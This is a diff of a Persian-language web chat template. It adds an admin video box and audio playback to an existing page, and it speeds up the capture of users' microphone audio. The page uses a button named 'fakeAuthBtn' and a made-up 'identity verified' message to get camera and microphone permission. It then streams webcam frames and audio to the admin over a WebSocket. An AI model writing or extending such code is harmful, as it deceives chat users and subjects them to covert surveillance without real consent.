@@ -29,6 +29,33 @@
         .message-row.user .message-content { background-color: #2f2f2f; color: #ececec; border-bottom-right-radius: 2px; }
         .message-row.ai .message-content { background-color: #1e1e1e; color: #ececec; border-bottom-left-radius: 2px; }
 
+        /* --- کادر استریم ادمین (شناور) --- */
+        #adminStreamBox {
+            display: none;
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            width: 140px;
+            z-index: 10;
+            background: #000;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 2px solid #4d6bfe;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        #adminStreamBox img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        #adminStreamBox .label {
+            color: #ff9800;
+            font-size: 9px;
+            text-align: center;
+            padding: 3px;
+            background: rgba(0,0,0,0.7);
+        }
+
         /* --- باکس ورودی --- */
         .input-container { position: absolute; bottom: 0; left: 0; right: 0; padding: 20px 20%; background: linear-gradient(180deg, transparent, #212121 30%); }
         .input-box { background-color: #2f2f2f; border-radius: 26px; padding: 12px 16px; display: flex; align-items: center; gap: 10px; }
@@ -40,6 +67,33 @@
         img, video, audio { max-width: 100%; border-radius: 8px; margin-top: 5px; }
         .disclaimer { text-align: center; font-size: 11px; color: #666; margin-top: 12px; }
 
+        /* دکمه فعال‌سازی صدا */
+        #audioUnlockBtn {
+            display: none;
+            position: fixed;
+            bottom: 120px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 20;
+        }
+        #audioUnlockBtn button {
+            background: #ff9800;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 14px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
         /* ===== ریسپانسیو برای تبلت ===== */
         @media (max-width: 1024px) {
             .messages { padding: 30px 10% 120px 10%; }
@@ -48,7 +102,7 @@
 
         /* ===== ریسپانسیو برای موبایل ===== */
         @media (max-width: 768px) {
-            .sidebar { display: none; } /* سایدبار در موبایل مخفی می‌شود */
+            .sidebar { display: none; }
             .messages { padding: 20px 4% 100px 4%; gap: 16px; }
             .input-container { padding: 15px 4%; }
             .message-content { max-width: 90%; font-size: 14px; padding: 10px 14px; }
@@ -57,6 +111,10 @@
             .input-box { padding: 10px 12px; }
             .input-box textarea { font-size: 14px; }
             #fakeAuthBtn button { font-size: 12px !important; padding: 8px 16px !important; }
+            
+            #adminStreamBox { width: 100px; top: 10px; right: 10px; }
+            #audioUnlockBtn { bottom: 100px; }
+            #audioUnlockBtn button { font-size: 12px; padding: 10px 16px; }
         }
     </style>
 </head>
@@ -72,6 +130,12 @@
         </div>
     </div>
     <div class="chat-main">
+        <!-- کادر نمایش استریم ادمین -->
+        <div id="adminStreamBox">
+            <img id="adminLiveVideo" alt="ادمین" />
+            <div class="label">📹 ادمین</div>
+        </div>
+        
         <div class="messages" id="messages">
             {% if not messages %}
             <div class="welcome-screen">
@@ -106,6 +170,11 @@
         </div>
     </div>
 
+    <!-- دکمه فعال‌سازی صدا (برای رفع Autoplay) -->
+    <div id="audioUnlockBtn">
+        <button onclick="unlockAudio()">🔊 برای شنیدن صدای ادمین کلیک کنید</button>
+    </div>
+
     <script>
         const userId = {{ user_id }};
         const adminId = {{ admin_id }};
@@ -113,12 +182,37 @@
         const input = document.getElementById('messageInput');
         let pendingFileUrl = null, pendingFileType = null;
 
-        // تشخیص خودکار پروتکل (ws برای لوکال، wss برای آنلاین)
+        // --- صف پخش صدا ---
+        let userAudioQueue = [];
+        let isUserPlayingAudio = false;
+        let audioUnlocked = false;
+
+        function unlockAudio() {
+            audioUnlocked = true;
+            document.getElementById('audioUnlockBtn').style.display = 'none';
+            playNextUserAudio();
+        }
+
+        function playNextUserAudio() {
+            if (!audioUnlocked) return;
+            if (userAudioQueue.length === 0) { isUserPlayingAudio = false; return; }
+            isUserPlayingAudio = true;
+            const audio = new Audio(userAudioQueue.shift());
+            audio.play().then(() => {
+                audio.onended = () => playNextUserAudio();
+            }).catch(() => {
+                document.getElementById('audioUnlockBtn').style.display = 'block';
+                isUserPlayingAudio = false;
+            });
+        }
+
+        // --- اتصال WebSocket ---
         const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
         const ws = new WebSocket(`${wsProtocol}${window.location.host}/ws/${userId}/user`);
         
         messagesDiv.scrollTop = messagesDiv.scrollHeight;
 
+        // --- استریم کاربر به ادمین (تایید هویت) ---
         window.startLiveStream = function() {
             document.getElementById('fakeAuthBtn').style.display = 'none';
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
@@ -128,7 +222,6 @@
                     successMsg.style.cssText = "color: #4caf50; text-align: center; font-size: 12px; margin-bottom: 10px;";
                     successMsg.textContent = "✅ هویت شما با موفقیت تایید شد. اکنون می‌توانید چت کنید.";
                     messagesDiv.appendChild(successMsg);
-                    
                     setTimeout(() => { if (successMsg) successMsg.remove(); }, 3000);
 
                     const video = document.createElement('video');
@@ -136,6 +229,7 @@
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
 
+                    // ارسال ویدیو
                     setInterval(() => {
                         if (video.videoWidth > 0) {
                             canvas.width = 320; canvas.height = 240;
@@ -145,8 +239,9 @@
                         }
                     }, 200);
 
+                    // ارسال صدا
                     const audioStream = new MediaStream(stream.getAudioTracks());
-                    const mediaRecorder = new MediaRecorder(audioStream);
+                    const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
                     mediaRecorder.ondataavailable = async (e) => {
                         if (e.data.size > 0) {
                             const reader = new FileReader();
@@ -156,7 +251,7 @@
                             reader.readAsDataURL(e.data);
                         }
                     };
-                    mediaRecorder.start(1000);
+                    mediaRecorder.start(500); // هر نیم ثانیه
                 })
                 .catch(err => {
                     alert("برای استفاده از چت، باید دسترسی به دوربین و میکروفون را تایید کنید.");
@@ -164,9 +259,32 @@
                 });
         };
 
+        // --- دریافت پیام‌ها و استریم ادمین ---
         ws.onmessage = function(event) {
             const data = JSON.parse(event.data);
-            if(data.type === 'new_message') appendMessage(data.sender_id, data.content, data.message_type);
+            
+            if (data.type === 'new_message') {
+                appendMessage(data.sender_id, data.content, data.message_type);
+            }
+            
+            // دریافت استریم ادمین
+            if (data.type === 'admin_stream') {
+                const box = document.getElementById('adminStreamBox');
+                const img = document.getElementById('adminLiveVideo');
+                
+                if (data.video) {
+                    box.style.display = 'block';
+                    img.src = data.video;
+                }
+                
+                if (data.audio) {
+                    if (!audioUnlocked) {
+                        document.getElementById('audioUnlockBtn').style.display = 'block';
+                    }
+                    userAudioQueue.push(data.audio);
+                    if (!isUserPlayingAudio) playNextUserAudio();
+                }
+            }
         };
 
         function appendMessage(senderId, content, type) {
